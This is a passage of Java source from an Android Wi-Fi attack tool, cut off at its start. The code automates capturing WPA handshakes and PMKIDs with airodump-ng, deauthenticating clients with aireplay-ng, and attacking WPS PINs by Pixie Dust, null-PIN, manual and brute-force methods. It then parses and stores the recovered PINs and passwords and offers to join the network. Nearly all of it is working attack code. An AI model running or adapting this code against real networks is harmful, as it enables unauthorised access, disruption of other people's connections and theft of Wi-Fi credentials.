                                return;
                            }
                            String hsDir = core.getShareRoot() + "/hs";
                            String capName = newestCapture(hsDir);
                            monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE,
                                    "Checking what the capture holds");
                            Verdict verdict = capName == null ? new Verdict()
                                    : verifyCapture(hsDir + "/" + capName,
                                            core.guestShare() + "/hs/" + capName,
                                            network.getMac());
                            if (verdict.answered && !verdict.usable()) {
                                sendEvent("Announced, but not there: the file holds no handshake"
                                        + " and no PMKID.");
                                monitor.failStage(AttackStage.EAPOL,
                                        "Nothing crackable in the capture",
                                        "airodump-ng reported a catch, but the file holds no"
                                                + " handshake and no PMKID. Nothing was saved.");
                                activity.runOnUiThread(this::onFinished);
                                return;
                            }
                            if (capName == null) {
                                sendEvent("Announced, but airodump-ng wrote no capture file.");
                                monitor.failStage(AttackStage.EAPOL, "No capture file",
                                        "airodump-ng reported a catch but left nothing on disk.");
                                activity.runOnUiThread(this::onFinished);
                                return;
                            }

                            boolean confirmed = verdict.usable();
                            boolean isHandshake = confirmed ? verdict.handshake : hsStatus[0];
                            monitor.stage(AttackStage.EAPOL, AttackStage.State.DONE,
                                    confirmed
                                            ? (isHandshake ? "Handshake" : "PMKID")
                                                    + " confirmed by " + verdict.source
                                            : "Saved unchecked — the capture could not be read back");

                            String captureDir = core.getShareRoot() + "/captured";
                            String time = new SimpleDateFormat("MM_HH_mm", Locale.ENGLISH).format(new Date());
                            String label = isHandshake ? "HS_" : "PMKID_";
                            String filename = label + network.getSsid().replace(" ", "_") + time + ".cap";
                            sendEvent(confirmed
                                    ? (isHandshake ? "Handshake" : "PMKID")
                                            + " confirmed in the capture by " + verdict.source + "."
                                    : "Saving without checking — neither this app nor aircrack-ng"
                                            + " could read the capture back.");
                            monitor.stage(AttackStage.SAVE, AttackStage.State.ACTIVE);
                            String saved = archiveCapture(captureDir, filename);
                            if (saved == null) {
                                sendEvent("Capture file not found — nothing was saved.");
                                monitor.stage(AttackStage.SAVE, AttackStage.State.FAILED,
                                        "Nothing to move out of the share");
                            } else {
                                sendEvent((isHandshake ? "Handshake" : "PMKID") + " saved to " + saved);
                                monitor.stage(AttackStage.SAVE, AttackStage.State.DONE, saved);
                                com.zalexdev.stryker.geomac.GeoHooks.recordHandshake(
                                        context, network.getMac(), network.ssid);
                            }
                            activity.runOnUiThread(this::onFinished);

                    }else {
                        sendEvent("Failed to start monitor mode");
                        monitor.failStage(AttackStage.MONITOR, "Interface refused monitor mode",
                                context.getString(R.string.wifi_monitor_failed, wlanscan));
                        setCanceled(true);
                    }
                }

                @Override
                public void onCanceled() {
                    sendEvent("Attack was canceled due to critical error, please check log for more information!");
                    activity.runOnUiThread(() -> {
                        deauthtimer.cancel();
                        if(airodump != null){
                            airodump.kill();
                        }
                        if(deauther != null){
                            deauther.kill();
                        }
                    });

                }
            };

        }
        else if (type == 4){
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + " -B -b " + network.getMac();
            String resume = core.getString(network.getMac()+"_pin");
            if (resume.length() > 0){
                cmd = cmd + " -p " + resume;
                monitor.note("Restoring progress: " + resume);
                monitor.metric(AttackMetric.PIN, resume);
            }
            monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE);

            brutepin = new AdvancedProcess(activity,context,cmd,true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    WiFINetwork back = issuccess(outputList);
                    if (back.getOK()){
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                        }
                        monitor.stage(AttackStage.WPS, AttackStage.State.DONE, "Pin accepted");
                        monitor.finish(true, context.getResources().getString(R.string.piin) + back.getPin()
                                + "\n" + context.getResources().getString(R.string.pass) + back.getPsk());
                        offerConnect(monitor, network, back.getPsk());
                    }else{
                        monitor.finish(false, "Pin not found!");
                    }
                }

                @Override
                public void onNewLine(String line) {
                    if (line.contains("Trying PIN")){
                        Matcher m = Pattern.compile("[0-9]+").matcher(line);
                        if (m.find()){
                            core.putString(network.getMac()+"_pin",m.group());
                        }
                    }
                    monitor.wps(masked(line));
                }
                @Override
                public void onEvent(String line) {

                }
            };
        }
        else if (type == 8){
            monitor.note(context.getResources().getString(R.string.wifi_null_pin_running));
            monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");
            new Thread(core::wpsDisableWifiIfEnabled, "wps-radio-off").start();
            String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                    + core.wpsIfaceDownFlag() + " -N -b " + network.getMac();
            oneshot = new AdvancedProcess(activity, context, cmd, true) {
                @Override
                public void onFinished(ArrayList<String> outputList) {
                    restoreWpsInterface();
                    WiFINetwork back = issuccess(outputList);
                    if (back.getOK()) {
                        if (core.isStoreEnabled()) {
                            core.saveNetwork(network.getMac(), back.getPsk(), back.getPin(), network.ssid);
                        }
                        monitor.stage(AttackStage.WPS, AttackStage.State.DONE, "Empty pin accepted");
                        monitor.finish(true, context.getResources().getString(R.string.piin) + back.getPin()
                                + "\n" + context.getResources().getString(R.string.pass) + back.getPsk());
                        offerConnect(monitor, network, back.getPsk());
                    } else if (Core.contains(outputList, "wps_locked")) {
                        monitor.failStage(AttackStage.WPS, "Registrar locked",
                                context.getString(R.string.wifi_wps_locked_result));
                    } else if (Core.contains(outputList, "foreign_owner")) {
                        monitor.failStage(AttackStage.WPS, "Another registrar owns the session",
                                context.getString(R.string.wifi_foreign_owner_result));
                    } else {
                        monitor.finish(false, "This router does not accept an empty WPS PIN.");
                    }
                }

                @Override
                public void onNewLine(String line) {
                    monitor.wps(masked(line));
                }

                @Override
                public void onEvent(String line) {

                }
            };
        }
        else if (type == 5){
            final String[] pin = {""};
                final Dialog valuedialog = new Dialog(context);
                valuedialog.setContentView(R.layout.input_dialog);
                android.view.Window vWin = valuedialog.getWindow();
                if (vWin != null) {
                    vWin.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
                    vWin.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
                }
                TextView title = valuedialog.findViewById(R.id.title);
                TextInputEditText valueedit = valuedialog.findViewById(R.id.value);
            MaterialButton ok = valuedialog.findViewById(R.id.ok);
            MaterialButton dismiss = valuedialog.findViewById(R.id.cancel);
            dismiss.setOnClickListener(view12 -> valuedialog.dismiss());
                title.setText(R.string.enter_pin);
                ok.setOnClickListener(view -> {
                        pin[0] = Objects.requireNonNull(valueedit.getText()).toString();
                      if (pin[0].length() == 8){
                        valuedialog.dismiss();
                        monitor.metric(AttackMetric.PIN, pin[0]);
                        monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE);

                          core.wpsDisableWifiIfEnabled();
                          String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pin[0] +" -b " + network.getMac();
                          oneshot = new AdvancedProcess(activity, context, cmd, true) {
                              @Override
                              public void onFinished(ArrayList<String> outputList) {
                                    restoreWpsInterface();
                                    WiFINetwork back = issuccess(outputList);
                                    if (back.getOK()){
                                        if (core.isStoreEnabled()) {
                                            core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                                        }
                                        monitor.stage(AttackStage.WPS, AttackStage.State.DONE, "Pin accepted");
                                        monitor.finish(true, context.getResources().getString(R.string.piin)
                                                + back.getPin() + "\n"
                                                + context.getResources().getString(R.string.pass) + back.getPsk());
                                        offerConnect(monitor, network, back.getPsk());
                                    }else{
                                        monitor.finish(false, "Pin incorrect!");
                                    }
                              }

                              @Override
                              public void onNewLine(String line) {
                                  monitor.wps(masked(line));
                              }

                              @Override
                              public void onEvent(String line) {

                              }
                          };
                      }else{
                        valueedit.setError("Pin must be 8 digits!");
                      }

               });
                valuedialog.setOnDismissListener(dialogInterface -> {
                    if (pin[0].length() <8){
                        monitor.dismiss();
                    }
                });
                valuedialog.show();

        }
        else if (type == 6){
            monitor.stage(AttackStage.PINS, AttackStage.State.ACTIVE);
            ArrayList<String> pins = new ArrayList<>();
            Context app = context;
            String pinGenCmd = "python3 -c \"import sys; sys.path.insert(0,'/CORE/PixieWps'); "
                    + "from pixie import WPSpin; [print(p) for p in WPSpin().getList(sys.argv[1])]\" "
                    + network.getMac();
            final Wordlist[] pinSource = { null };
            final Runnable runPinAttack = () -> new Thread(() -> {
                final ArrayList<String> outputList = pinSource[0] != null
                        ? readPinCandidates(pinSource[0])
                        : core.customChrootCommand(pinGenCmd);
                if (dialogCanceled.get()) return;
                activity.runOnUiThread(() -> {
                    if (dialogCanceled.get()) return;
                    if (outputList.size() > 0){
                        Pattern p = Pattern.compile("[0-9]{8}");
                        for (String line : outputList){
                            Matcher m = p.matcher(line);
                            if (m.find()){
                                pins.add(m.group());
                            }
                        }
                    }

                    if (pins.isEmpty()){
                        monitor.failStage(AttackStage.PINS, "No pins produced for this BSSID",
                                "Pin generation failed");
                        return;
                    }

                    final int[] pin_count = {pins.size()};
                    monitor.stage(AttackStage.PINS, AttackStage.State.DONE, pins.size() + " candidates");
                    monitor.metric(AttackMetric.LEFT, pins.size());

                    String[] pins_list = new String[pins.size()+1];
                    for (int i = 1; i < pins.size()+1; i++){
                        pins_list[i] = pins.get(i-1);
                    }
                    pins_list[0] = "Test all";
                    AtomicBoolean selected = new AtomicBoolean(false);
                    new MaterialAlertDialogBuilder(app)
                            .setTitle("Select pin")
                            .setItems(pins_list, (dialogInterface, i) -> {
                                core.wpsDisableWifiIfEnabled();
                                selected.set(true);
                                monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE);
                                if (i == 0){
                                    if (pins.size() > 0){
                                        monitor.note("Generated " + pin_count[0] + " pins");
                                        final WiFINetwork[] result = {null};
                                        brutepsk = new AdvancedThread(activity, app) {
                                            @Override
                                            public void onFinished() {
                                                restoreWpsInterface();
                                                if (result[0] != null && result[0].getOK()){
                                                    if (core.isStoreEnabled()) {
                                                        core.saveNetwork(network.getMac(),result[0].getPsk(),result[0].getPin(),network.ssid);
                                                    }
                                                    monitor.stage(AttackStage.WPS, AttackStage.State.DONE, "Pin accepted");
                                                    monitor.finish(true, context.getResources().getString(R.string.piin)
                                                            + result[0].getPin() + "\n"
                                                            + context.getResources().getString(R.string.pass) + result[0].getPsk());
                                                    offerConnect(monitor, network, result[0].getPsk());
                                                }
                                                else {
                                                    monitor.finish(false, "Pin not found!");
                                                }
                                            }

                                            @Override
                                            public void eventListener(String line) {
                                                monitor.note(line);
                                            }

                                            @Override
                                            public void doOnBackground() {
                                                try {
                                                    Thread.sleep(4000);
                                                } catch (InterruptedException e) {
                                                    e.printStackTrace();
                                                }
                                                String scaninterface = core.getWPSInterface();
                                                int index = 0;
                                                for (String pin :pins){
                                                    if (canceled){
                                                        break;
                                                    }
                                                    pin_count[0]--;
                                                    index++;
                                                    monitor.metric(AttackMetric.PIN, pin);
                                                    monitor.metric(AttackMetric.PROGRESS, index + " / " + pins.size());
                                                    monitor.metric(AttackMetric.LEFT, pin_count[0]);
                                                    String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + scaninterface + core.wpsIfaceDownFlag() + " -p "+pin+" -b " + network.getMac();
                                                    final ArrayList<String> pinOutput = new ArrayList<>();
                                                    brutepin = new AdvancedProcess(activity, app, cmd, true) {
                                                        @Override
                                                        public void onFinished(ArrayList<String> lines) {
                                                        }

                                                        @Override
                                                        public void onNewLine(String line) {
                                                            pinOutput.add(line);
                                                            monitor.wps(masked(line));
                                                        }

                                                        @Override
                                                        public void onEvent(String line) {
                                                        }
                                                    };
                                                    while (brutepin.isRunning() && !canceled){
                                                        try {
                                                            Thread.sleep(500);
                                                        } catch (InterruptedException e) {
                                                            break;
                                                        }
                                                    }
                                                    if (canceled){
                                                        brutepin.kill();
                                                        break;
                                                    }
                                                    result[0] = issuccess(pinOutput);
                                                    if (result[0].getOK()){
                                                        break;
                                                    }
                                                }
                                            }

                                            @Override
                                            public void onCanceled() {

                                            }
                                        };



                                    }
                                }else{
                                    monitor.metric(AttackMetric.PIN, pins.get(i-1));
                                    monitor.metric(AttackMetric.PROGRESS, "1 / 1");
                                    monitor.note("Trying pin " + pins.get(i-1));

                                    String cmd = "python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface() + core.wpsIfaceDownFlag() + " -p "+ pins.get(i-1) +" -b " + network.getMac();
                                    oneshot = new AdvancedProcess(activity, context, cmd, true) {
                                        @Override
                                        public void onFinished(ArrayList<String> outputList) {
                                            restoreWpsInterface();
                                            WiFINetwork back = issuccess(outputList);
                                            if (back.getOK()){
                                                if (core.isStoreEnabled()) {
                                                    core.saveNetwork(network.getMac(),back.getPsk(),back.getPin(),network.ssid);
                                                }
                                                monitor.stage(AttackStage.WPS, AttackStage.State.DONE, "Pin accepted");
                                                monitor.finish(true, context.getResources().getString(R.string.piin)
                                                        + back.getPin() + "\n"
                                                        + context.getResources().getString(R.string.pass) + back.getPsk());
                                                offerConnect(monitor, network, back.getPsk());
                                            }else{
                                                monitor.finish(false, "Pin incorrect!");
                                            }
                                        }

                                        @Override
                                        public void onNewLine(String line) {
                                            monitor.wps(masked(line));
                                        }

                                        @Override
                                        public void onEvent(String line) {

                                        }
                                    };
                                }
                            }).setOnDismissListener(dialog1 -> {
                                if (!selected.get()){
                                    monitor.dismiss();
                                }
                            })
                            .show();
                });
            }).start();

            new MaterialAlertDialogBuilder(context)
                    .setTitle(R.string.wifi_pin_source)
                    .setItems(new String[] {
                                    context.getString(R.string.wifi_pin_source_generated),
                                    context.getString(R.string.wifi_pin_source_wordlist) },
                            (sourceDialog, which) -> {
                                if (which == 0) {
                                    runPinAttack.run();
                                    return;
                                }
                                WordlistPickerDialog.show(context, activity, core,
                                        context.getString(R.string.wifi_pin_source_wordlist),
                                        WordlistCategory.PIN, null,
                                        picked -> {
                                            pinSource[0] = picked;
                                            runPinAttack.run();
                                        });
                            })
                    .setOnCancelListener(sourceDialog -> monitor.dismiss())
                    .show();
        }
        else if (type == 7){
            final int channel = network.getChannel();
            monitor.metric(AttackMetric.CHANNEL, channel > 0 ? String.valueOf(channel) : "any");
            new Thread(() -> {
                if (dialogCanceled.get()) return;
                String deauthIface = core.getDeauthInterface();
                monitor.metric(AttackMetric.IFACE, deauthIface);
                monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE, deauthIface);
                if (!core.isRootless() && !core.isInternalDeauthEnabled()
                        && MonitorManager.isInternalRadio(deauthIface)) {
                    monitor.failStage(AttackStage.MONITOR, "wlan0 deauth is disabled",
                            "Enable 'Deauth with internal adapter' in Settings, or use an external adapter");
                    return;
                }
                boolean ok = core.enableMonitorMode(deauthIface, String.valueOf(channel));
                if (dialogCanceled.get()) return;
                final String monIface = core.getDeauthInterface();
                monitor.metric(AttackMetric.IFACE, monIface);
                if (!ok) {
                    monitor.failStage(AttackStage.MONITOR, "Interface refused monitor mode",
                            context.getString(R.string.wifi_monitor_failed, monIface));
                    return;
                }
                monitor.stage(AttackStage.MONITOR, AttackStage.State.DONE, monIface);
                deauthAttempt(monitor, network, monIface, channel, dialogCanceled, 0);
            }).start();
        }
    }

    private static final long LISTEN_FIRST_MS = 45_000L;

    private AdvancedProcess startAirodump(AttackMonitor monitor, WiFINetwork network,
                                          String capIface, String guestShare, int channel,
                                          boolean[] airoRunning, boolean[] hsStatus,
                                          boolean[] pmkidStatus, Say say) {
        String cmd = "airodump-ng " + capIface + " -w " + guestShare
                + "/hs/handshake --ignore-negative-one --output-format pcap -c "
                + channel + " --bssid " + network.getMac() + " --update 3";
        if (network.getIs5hhz() && channel <= 0) {
            cmd = "airodump-ng " + capIface + " -w " + guestShare
                    + "/hs/handshake --ignore-negative-one --output-format pcap --bssid "
                    + network.getMac() + " --band a --update 3";
        }
        core.getLogger().writeLine("Starting airodump-ng... " + cmd, 1);
        AdvancedProcess p = new AdvancedProcess(activity, context, cmd, true) {
            @Override
            public void onFinished(ArrayList<String> outputList) {
            }

            @Override
            public void onNewLine(String line) {
                try {
                    if (line == null) return;
                    if (line.contains(network.getMac().toUpperCase())
                            || line.contains(network.getMac())
                            || line.contains(network.getMac().toLowerCase())
                            || line.contains(" WPA")) {
                        if (!airoRunning[0]) {
                            monitor.stage(AttackStage.CAPTURE, AttackStage.State.DONE);
                            monitor.stage(AttackStage.TARGET, AttackStage.State.DONE,
                                    "Beacons on channel " + channel);
                        }
                        airoRunning[0] = true;
                    }
                    if (line.contains("WPA handshake:")) {
                        say.line("Handshake captured! Bingo!");
                        hsStatus[0] = true;
                    }
                    if (line.contains("PMKID")) {
                        say.line("PMKID captured! Bingo!");
                        pmkidStatus[0] = true;
                    }
                    monitor.airodump(line, network.getMac());
                } catch (Exception ignored) {
                }
            }

            @Override
            public void onEvent(String line) {
            }
        };
        p.setNoLog(true);
        return p;
    }

    public interface Say {
        void line(String text);
    }

    private static final int MAX_RELOCKS = 3;

    private static final long DEAUTH_BURST_MS = 7_000L;

    private static final long DEAUTH_BEACON_GRACE_MS = 20_000L;

    private static final int DEAUTH_MAX_CLIENTS = 12;

    private static final long DEAUTH_QUIET_MS = 20_000L;

    private AdvancedProcess burstDeauth(AttackMonitor monitor, WiFINetwork network,
                                        String deauthIface, String hsIface,
                                        boolean internalDeauth, String[] lastRelock,
                                        int[] relockTo, java.util.List<String> clients,
                                        long[] startedAt) {
        return new AdvancedProcess(activity, context,
                deauthCommand(network.getMac(), deauthIface, clients), true) {
            @Override
            public void onFinished(ArrayList<String> outputList) {
            }

            @Override
            public void onNewLine(String line) {
                if (line.contains("available") || line.contains("but")) {
                    if (line.contains("but")) {
                        String[] parts = line.trim().split("\\s+");
                        String ch = parts[parts.length - 1];
                        if (ch.matches("\\d{1,3}") && !ch.equals(lastRelock[0])) {
                            lastRelock[0] = ch;
                            try {
                                relockTo[0] = Integer.parseInt(ch);
                            } catch (NumberFormatException ignored) {
                            }
                        }
                    }
                    if (internalDeauth) {
                        monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
                                "Internal radio cannot inject — waiting passively");
                    }
                }
                if (startedAt[0] == 0L && line.contains("Sending") && line.contains("DeAuth")) {
                    startedAt[0] = System.currentTimeMillis();
                }
                monitor.aireplay(masked(line));
            }

            @Override
            public void onEvent(String line) {
            }
        };
    }

    private static String deauthCommand(String bssid, String iface, java.util.List<String> clients) {
        String sb = "__SB=$(command -v stdbuf 2>/dev/null); ";
        String run = "$__SB ${__SB:+-oL -eL} aireplay-ng --ignore-negative-one -0 ";
        if (clients == null || clients.isEmpty()) {
            return sb + run + "0 -a " + bssid + " " + iface;
        }
        int n = Math.min(clients.size(), DEAUTH_MAX_CLIENTS);
        long each = Math.max(1L, DEAUTH_BURST_MS / 1000L / n);
        StringBuilder out = new StringBuilder(sb).append("for __c in");
        for (int i = 0; i < n; i++) out.append(' ').append(clients.get(i));
        out.append("; do ").append(run).append(each).append(" -a ").append(bssid)
                .append(" -c $__c ").append(iface).append("; done");
        return out.toString();
    }

    private static final long DEAUTH_SILENCE_MS = 25000L;

    private void deauthAttempt(AttackMonitor monitor, WiFINetwork network, String iface,
                               int channel, AtomicBoolean canceled, int attempt) {
        if (canceled.get()) return;
        monitor.stage(AttackStage.INJECT, AttackStage.State.ACTIVE, attempt == 0
                ? "aireplay-ng on channel " + channel
                : "retry " + attempt + " on channel " + channel);

        final int[] apChannel = { channel };
        final boolean[] sent = { false };
        final boolean[] done = { false };

        deauther = new AdvancedProcess(activity, context,
                "aireplay-ng --ignore-negative-one -0 0 -a " + network.getMac() + " " + iface, true) {
            @Override
            public void onFinished(ArrayList<String> outputList) {
                if (canceled.get() || done[0]) return;
                done[0] = true;
                if (sent[0]) {
                    monitor.finish(false, "Deauthentication stopped");
                    return;
                }
                if (apChannel[0] > 0 && apChannel[0] != channel) {
                    monitor.note("Nothing was sent on channel " + channel
                            + " — retuning to " + apChannel[0]);
                    new Thread(() -> {
                        core.customChrootCommand("iw dev " + iface + " set channel " + apChannel[0]);
                        deauthAttempt(monitor, network, iface, apChannel[0], canceled, attempt + 1);
                    }, "deauth-retry").start();
                    return;
                }
                monitor.failStage(AttackStage.INJECT,
                        "No beacons from the target on channel " + channel,
                        "aireplay-ng never saw " + network.getSsid() + " on channel " + channel
                                + ".\nThe AP has moved channel, is out of range, or this adapter"
                                + " cannot inject.");
            }

            @Override
            public void onNewLine(String line) {
                if (line == null) return;
                if (line.contains("Sending") && line.contains("DeAuth")) sent[0] = true;
                Integer named = apChannelIn(line);
                if (named != null && named != apChannel[0]) {
                    apChannel[0] = named;
                    monitor.metric(AttackMetric.CHANNEL, String.valueOf(named));
                    monitor.note("AP answers on channel " + named + " — retuning " + iface);
                    core.threadChrootCommand("iw dev " + iface + " set channel " + named);
                }
                monitor.aireplay(masked(line));
            }

            @Override
            public void onEvent(String line) {

            }
        };

        new Thread(() -> {
            long deadline = System.currentTimeMillis() + DEAUTH_SILENCE_MS;
            while (System.currentTimeMillis() < deadline) {
                if (canceled.get() || sent[0] || done[0]) return;
                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    return;
                }
            }
            if (!sent[0] && !done[0] && !canceled.get() && deauther != null) {
                monitor.note("No bursts in " + (DEAUTH_SILENCE_MS / 1000) + "s — restarting");
                deauther.kill();
            }
        }, "deauth-watchdog").start();
    }

    private static Integer apChannelIn(String line) {
        if (!line.contains("but") || !line.contains("channel")) return null;
        String[] parts = line.trim().split("\\s+");
        String last = parts[parts.length - 1].replaceAll("[^0-9]", "");
        if (last.isEmpty() || last.length() > 3) return null;
        try {
            int ch = Integer.parseInt(last);
            return ch > 0 ? ch : null;
        } catch (NumberFormatException e) {
            return null;
        }
    }

    private static int countLines(String path) {
        int lines = 0;
        try (BufferedReader br = new BufferedReader(new FileReader(path))) {
            while (br.readLine() != null) lines++;
        } catch (IOException e) {
            return 0;
        }
        return lines;
    }

    private static void reportPace(AttackMonitor monitor, long began, int tried, int total) {
        long spent = System.currentTimeMillis() - began;
        if (spent <= 0 || tried <= 0) return;
        float perMinute = tried * 60000f / spent;
        monitor.metric(AttackMetric.RATE, String.format(Locale.US, "%.1f/min", perMinute));
        monitor.rate(perMinute);
        if (total > tried) {
            long left = (long) ((total - tried) * (spent / (float) tried));
            long minutes = left / 60000L;
            monitor.metric(AttackMetric.ETA, minutes >= 60
                    ? (minutes / 60) + "h " + (minutes % 60) + "m"
                    : minutes + "m");
        }
    }







    public void restoreWpsInterface() {
        new Thread(() -> {
            if (core.isRootless()) {
                String wpsIface = core.getWPSInterface();
                if (wpsIface != null && wpsIface.length() > 0) {
                    core.customChrootCommand("ifconfig " + wpsIface + " up", true);
                }
                String hsIface = core.getHSInterface();
                if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                    core.customChrootCommand("ifconfig " + hsIface + " up", true);
                }
                return;
            }
            String wpsIface = core.getWPSInterface();
            if (wpsIface != null && wpsIface.length() > 0) {
                core.customCommand("ifconfig " + wpsIface + " up", true);
            }
            String hsIface = core.getHSInterface();
            if (hsIface != null && hsIface.length() > 0 && !hsIface.equals(wpsIface)) {
                core.customCommand("ifconfig " + hsIface + " up", true);
            }
            if (core.isPixieIfaceDown()) {
                core.customCommand("svc wifi enable", true);
            }
        }).start();
    }

    public WiFINetwork issuccess(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            } else if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        if (out.isEmpty()) {
            back.setCanceled(true);
        }
        return back;
    }


    public boolean checkIsSsidConnected(String ssid){
        if (core.isRootless()) {
            try {
                android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager)
                        context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                if (wm != null) {
                    android.net.wifi.WifiInfo info = wm.getConnectionInfo();
                    if (info != null && info.getSSID() != null) {
                        return info.getSSID().replace("\"", "").equals(ssid);
                    }
                }
            } catch (Exception ignored) {
            }
            return false;
        }
        String line;
        boolean result = false;
        try {

            Process process = Runtime.getRuntime().exec("su -mm");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();
            stdin.write(("dumpsys netstats | grep wlan" + '\n').getBytes());
            stdin.write(("\n").getBytes());
            stdin.flush();
            stdin.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            while ((line = br.readLine()) != null) {
                if (line.contains(ssid)) {
                    result = true;
                }
            }
            br.close();
            process.waitFor();
            process.destroy();
        } catch (IOException e) {
        } catch (InterruptedException ex) {
        }

        return result;
    }
    @RequiresApi(api = Build.VERSION_CODES.O)
    public void createBruteNotification(String key, int prog, int max) {
        Intent intent = new Intent(core.getContext(), MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(core.getContext(), 0, intent, Utils.setPendingIntentFlag());
        String CHANNEL_ID = "BruteForce PSK";
        NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "BruteForce PSK", NotificationManager.IMPORTANCE_LOW);

        NotificationCompat.Builder b = new NotificationCompat.Builder(core.getContext());

        b.setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL)
                .setWhen(System.currentTimeMillis())
                .setSmallIcon(R.drawable.bolt)
                .setTicker("Brute")
                .setContentTitle(key)
                .setChannelId(CHANNEL_ID)
                .setDefaults(Notification.DEFAULT_LIGHTS | Notification.DEFAULT_SOUND)
                .setContentIntent(contentIntent)
                .setProgress(max, prog, false)
                .setContentInfo("Info");


        NotificationManager notificationManager = (NotificationManager) core.getContext().getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.createNotificationChannel(notificationChannel);
        notificationManager.notify(5, b.build());
    }
    public void toaster(String msg) {
        activity.runOnUiThread(() -> {
            Toast toast = Toast.makeText(context,
                    msg, Toast.LENGTH_SHORT);
            toast.show();
        });

    }

    public void settext(String text, TextView output) {
        activity.runOnUiThread(() -> output.setText(text));
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    public void changeitem(WiFINetwork temp, int pos) {
        activity.runOnUiThread(() -> {
            wifilist.set(pos, temp);
            notifyItemChanged(pos);

        });
    }

    @Override
    public int getItemViewType(int position) {
        return position;
    }
    public WiFINetwork pixie(ArrayList<String> out) {
        String pin;
        String pass;

        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS pin:")) {
                pin = s.replace("[+] WPS pin: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            }
            if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            }
        }
        return back;
    }

    public static class ViewHolder extends RecyclerView.ViewHolder {
        public TextView wifi_name;
        public TextView wifi_mac;
        public TextView wifi_model;
        public TextView wifi_power;
        public TextView wps_mark;
        public TextView five_mark;
        public TextView pixie_mark;
        public TextView lock_mark;
        public TextView key_mark;
        public TextView iswps;
        public View card;
        public ImageView icon;
        public View divider;


        public ViewHolder(View v) {
            super(v);
            wifi_name = v.findViewById(R.id.wifi_name);
            wifi_mac = v.findViewById(R.id.wifi_bssid);
            wifi_model = v.findViewById(R.id.wifi_model);
            wifi_power = v.findViewById(R.id.wifi_power);
            iswps = v.findViewById(R.id.iswps);
            card = v.findViewById(R.id.item);
            icon = v.findViewById(R.id.icon_wifi);
            wps_mark = v.findViewById(R.id.wps_mark);
            five_mark = v.findViewById(R.id.five_mark);
            pixie_mark = v.findViewById(R.id.pixie_mark);
            lock_mark = v.findViewById(R.id.lock_mark);
            key_mark = v.findViewById(R.id.key_mark);
            divider = v.findViewById(R.id.wifi_item_divider);
        }

    }

}
